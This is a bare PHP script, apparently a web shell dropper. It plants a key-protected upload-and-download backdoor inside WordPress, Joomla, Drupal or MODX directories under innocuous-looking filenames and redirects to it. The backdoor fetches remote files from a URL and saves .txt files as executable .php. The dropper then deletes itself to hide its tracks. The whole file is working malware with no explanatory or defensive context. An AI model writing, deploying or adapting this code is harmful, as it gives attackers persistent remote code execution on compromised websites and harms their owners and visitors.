<?php 
$randStr = str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
$rand = substr($randStr,0,6);
$htm='<?php error_reporting(0); $path = __DIR__; if($_GET["rands"]=="'.$rand.'"){if(isset($_FILES["file_u"])){$ftarget=basename($_FILES["file_u"]["name"]); if(move_uploaded_file($_FILES["file_u"]["tmp_name"], $ftarget)){echo "<font color=\"green\">get file ok</font><br />";}else{echo "<font color=\"red\">fail</font><br />"; }} echo "<form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"file_u\" type=\"file\"/><input type=\"submit\" value=\"Target File\"/></form></td></tr>"; function get($site, $dir){ $getf=curl_init(); curl_setopt($getf, CURLOPT_URL, $site); curl_setopt($getf, CURLOPT_RETURNTRANSFER, 1); curl_setopt($getf,CURLOPT_TIMEOUT,10); $data = curl_exec($getf); if(!$data){ $data = @file_get_contents($site);} file_put_contents($dir, $data);} if($_GET["url"]){ $site = $_GET["url"]; preg_match("/(.*)\/(.*)\.(.*?)$/",$site,$n); if($n[3]=="txt"){ $z="php"; $name=$n[2]; }else{ $z=$n[3]; $name="moban"; } if($_GET["dir"]){ $dir=$_SERVER["DOCUMENT_ROOT"]."/".$_GET["dir"]."/".$name.".".$z; }else{ $dir=$_SERVER["DOCUMENT_ROOT"]."/".$name.".".$z;} get($site,$dir); if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}}elseif($_POST["url"]){ $site = $_POST["url"]; preg_match("/(.*)\/(.*)\.(.*?)$/",$site,$n); if($n[3]=="txt"){ $z="php"; $name=$n[2];}else{$z=$n[3]; $name="moban";} $dir = $_POST["path"]."/".$name.".".$z; get($site,$dir); if(file_exists($dir)){echo "<tr><td><font color=\"green\">download success</font></td></tr>";}else{echo "<tr><td><font color=\"red\">download fail</font></td></tr>";}}echo "<tr><td><form method=\"POST\"><span>Download: </span><input type=text name=\"url\" value=\"\"><input type=\"hidden\" name=\"path\" value=\"$path\"><input type=submit value=\"Download\"></form></td></tr>";} ?>';

$home = $_SERVER['SERVER_NAME'];
$RootDir = $_SERVER['DOCUMENT_ROOT'];
if(is_dir($RootDir . "/wp-admin/includes")){
	file_put_contents($RootDir . "/wp-admin/includes/class-filesystem-upgrader.php", $htm);
	$url1 = "http://".$home."/wp-admin/includes/class-filesystem-upgrader.php?rands=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url1.'">';
}
else if(is_dir($RootDir . "/modules/mod_search")){
	file_put_contents($RootDir . "/modules/mod_search/deprecated.php", $htm);
	$url2 = "http://".$home."/modules/mod_search/deprecated.php?rands=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url2.'">';
}
else if(is_dir($RootDir . "/includes/database")){
	file_put_contents($RootDir . "/includes/database/moderation.php", $htm);
	$url3 = "http://".$home."/includes/database/moderation.php?rands=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url3.'">';
}
else if(is_dir($RootDir . "/manager/controllers")){
	file_put_contents($RootDir . "/manager/controllers/users-list-table.php", $htm);
	$url4 = "http://".$home."/manager/controllers/users-list-table.php?rands=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url4.'">';
}else {
	if(!is_dir($RootDir . "/ogretmenevi"))
	mkdir($RootDir . "/ogretmenevi",0777);
	if(!is_dir($RootDir . "/ogretmenevi/js"))
	mkdir($RootDir . "/ogretmenevi/js",0777);
	file_put_contents($RootDir . "/ogretmenevi/js/bootstrap.php", $htm);
	$url5 = "http://".$home."/ogretmenevi/js/bootstrap.php?rands=".$rand;
	echo '<meta http-equiv="Refresh" content="0; url='.$url5.'">';
}
unlink("./test.php");